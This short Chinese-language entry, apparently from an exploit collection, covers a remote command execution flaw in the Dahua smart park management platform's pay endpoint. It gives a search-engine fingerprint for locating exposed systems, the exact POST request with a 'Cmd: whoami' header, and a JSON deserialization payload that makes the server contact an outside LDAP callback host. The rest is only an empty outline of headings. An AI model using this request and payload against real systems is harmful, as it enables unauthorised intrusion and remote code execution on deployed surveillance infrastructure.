# 大华智慧园区综合管理平台pay远程命令执行

- **系统**：大华　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /ipms/barpay/pay HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 127`　`Cmd: whoami`　`Content-Type: application/json`

**请求体 / payload**
```
{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://uh8aga.dnslog.cn", "autoCommit": true}
```

**其他**
- 大华智慧园区综合管理平台pay 远程命令执行: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台